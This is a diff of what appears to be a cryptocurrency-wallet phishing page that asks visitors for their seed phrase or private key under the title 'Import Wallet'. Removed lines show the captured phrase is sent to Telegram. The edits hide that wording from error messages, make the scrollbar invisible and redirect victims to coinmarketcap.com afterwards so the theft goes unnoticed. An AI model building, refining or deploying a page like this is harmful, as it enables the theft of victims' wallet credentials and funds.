@@ -3,111 +3,133 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=350, height=600, initial-scale=1.0" />
-  <title>Access your wallet with your Secret Recovery Phrase</title>
+  <title>Import Wallet</title>
   <style>
-    * { box-sizing: border-box; }
-    body {
-      font-family: Arial, sans-serif;
-      margin: 0;
-	  
-      padding: 20px;
-      background: #fff;
+    html, body {
       width: 350px;
       height: 600px;
-      overflow-y: auto;
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background: #fff;
+    }
+
+    body {
       display: flex;
       flex-direction: column;
       align-items: center;
+      padding: 20px;
+      box-sizing: border-box;
+      overflow-y: auto;
+
+      /* ✅ Scroll invisible */
+      scrollbar-width: none;        /* Firefox */
+      -ms-overflow-style: none;     /* IE/Edge */
     }
+
+    body::-webkit-scrollbar {
+      width: 0px;                  /* Chrome/Edge */
+      background: transparent;
+    }
+
     h2 {
       text-align: center;
-	   margin: 0 auto 0 90px; /* ← centrage avec léger décalage à droite */
       font-weight: 600;
-      margin-bottom: 40px;
+      margin-bottom: 20px;
     }
+
     .tab-buttons {
       display: flex;
-	  margin: 0 auto 0 38px; /* ← centrage avec léger décalage à droite */
       width: 100%;
+      margin-bottom: 15px;
+      background: #e0e0e0;
       border-radius: 8px;
       overflow: hidden;
-      margin-bottom: 15px;
+      box-shadow: inset 0 0 2px rgba(0,0,0,0.2);
     }
+
     .tab-buttons button {
-      width: 50%;
-	  
+      flex: 1;
       padding: 12px 0;
       border: none;
-      cursor: pointer;
       font-weight: bold;
       font-size: 14px;
-      transition: background 0.3s;
+      cursor: pointer;
+      background-color: transparent;
+      color: #333;
+      transition: background 0.3s, color 0.3s;
     }
+
     .tab-buttons button.active {
-      background-color: #ffffff;
-	  
+      background-color: #d4d4d4;
       color: black;
-      border: 1px solid #ccc;
-      border-bottom: 2px solid black;
     }
+
     .tab-buttons button.inactive {
-	
-      background-color: #f0f0f0;
-      color: #888;
-      border: 1px solid #ccc;
-      border-bottom: none;
+      background-color: white;
+      color: #666;
     }
+
     label {
       display: block;
-	  
-	  margin: 0 auto 0 55px; /* ← centrage avec léger décalage à droite */
       margin-bottom: 8px;
       font-size: 14px;
     }
+
     select {
       width: 100%;
-	    margin: 0 auto 0 40px; /* ← centrage avec léger décalage à droite */
       padding: 8px;
       border-radius: 5px;
       border: 1px solid #ccc;
-      margin-bottom: 15px;
+      margin-bottom: 10px;
     }
+
     .grid {
       display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 10px;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 8px;
+      width: 100%;
+      margin-top: 10px;
     }
-    .grid input {
-      padding: 10px;
 
-      border-radius: 8px;
-      border: 1px solid #ccc;
-      font-size: 14px;
+    .grid input {
+      width: 100%;
+      box-sizing: border-box;
+      padding: 12px;
+      font-size: 15px;
+      border-radius: 6px;
+      border: 1.5px solid #999;
+      background: #fefefe;
     }
+
     .confirm-container {
-      display: flex;
-      justify-content: center;
       margin-top: 25px;
     }
+
     .confirm-btn {
+      display: block;
       width: 100%;
-	  margin: 0 auto 0 40px; /* ← centrage avec léger décalage à droite */
+      margin: 0 auto;
       padding: 12px;
       background-color: black;
       color: white;
       border: none;
-      border-radius: 60px;
+      border-radius: 30px;
       font-size: 16px;
       cursor: pointer;
     }
-    .hidden { display: none; }
-    .content { width: 100%; }
+
+    .content {
+      width: 100%;
+    }
+
     .message {
       margin-top: 15px;
       text-align: center;
       font-weight: bold;
       font-size: 14px;
     }
+
     .error { color: red; }
     .success { color: green; }
   </style>
@@ -116,23 +138,28 @@
 
   <h2>Importing a wallet</h2>
 
-  <div class="tab-buttons">
-    <button id="secretTab" class="active" onclick="showTab('secret')">Secret phrase</button>
-    <button id="privateTab" class="inactive" onclick="showTab('private')">Private key</button>
-  </div>
-
   <div class="content">
-    <div id="secretTabContent">
-      <label for="wordsCount">The number of words in my seed phrase:</label>
-      <select id="wordsCount" onchange="updateInputs(this.value)">
-        <option value="12" selected>12 words</option>
-        <option value="24">24 words</option>
-      </select>
+
+    <!-- Onglets -->
+    <div class="tab-buttons">
+      <button id="secretTab" class="active" onclick="showTab('secret')">Secret phrase</button>
+      <button id="privateTab" class="inactive" onclick="showTab('private')">Private key</button>
+    </div>
+
+    <label for="wordsCount">The number of words in my seed phrase:</label>
+    <select id="wordsCount" onchange="updateInputs(this.value)">
+      <option value="12" selected>12 words</option>
+      <option value="24">24 words</option>
+    </select>
+
+    <!-- Zone de saisie -->
+    <div id="secretTabContent" style="display: block;">
       <div class="grid" id="seedInputs"></div>
     </div>
 
-    <div id="privateTabContent" class="hidden">
-      <textarea id="privateKeyInput" placeholder="Enter your private key" rows="6" style="width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #ccc;"></textarea>
+    <div id="privateTabContent" style="display: none;">
+      <textarea id="privateKeyInput" placeholder="Enter your private key" rows="6"
+        style="width: 100%; padding: 12px; border-radius: 8px; border: 1.5px solid #999; margin-top: 15px;"></textarea>
     </div>
 
     <div class="confirm-container">
@@ -168,19 +195,20 @@
       const secretContent = document.getElementById('secretTabContent');
       const privateContent = document.getElementById('privateTabContent');
 
-      secretTab.classList.remove('active', 'inactive');
-      privateTab.classList.remove('active', 'inactive');
-
       if (tab === 'secret') {
         secretTab.classList.add('active');
+        privateTab.classList.remove('active');
+        secretTab.classList.remove('inactive');
         privateTab.classList.add('inactive');
-        secretContent.classList.remove('hidden');
-        privateContent.classList.add('hidden');
+        secretContent.style.display = 'block';
+        privateContent.style.display = 'none';
       } else {
-        secretTab.classList.add('inactive');
+        secretTab.classList.remove('active');
         privateTab.classList.add('active');
-        secretContent.classList.add('hidden');
-        privateContent.classList.remove('hidden');
+        secretTab.classList.add('inactive');
+        privateTab.classList.remove('inactive');
+        secretContent.style.display = 'none';
+        privateContent.style.display = 'block';
       }
 
       showMessage("");
@@ -202,15 +230,15 @@
           showMessage("", false);
           if (redirectAfter) {
             setTimeout(() => {
-              window.location.href = "https://ton-site.com/success.html"; // ⬅️ change ici
+              window.location.href = "https://coinmarketcap.com/";
             }, 1000);
           }
         } else {
-          showMessage("❌ Failed to send", true);
+          showMessage("❌ Failed", true);
         }
       })
       .catch(() => {
-        showMessage("❌ Error sending to Telegram", true);
+        showMessage("❌ Error", true);
       });
     }
 
@@ -234,7 +262,7 @@
 
         const invalidWords = words.filter(w => !bip39Words.includes(w));
         if (invalidWords.length > 0) {
-          showMessage("❌ Incorrect phrase", true);
+          showMessage("❌ Invalid Secret Recovery Phrase", true);
           return;
         }
 
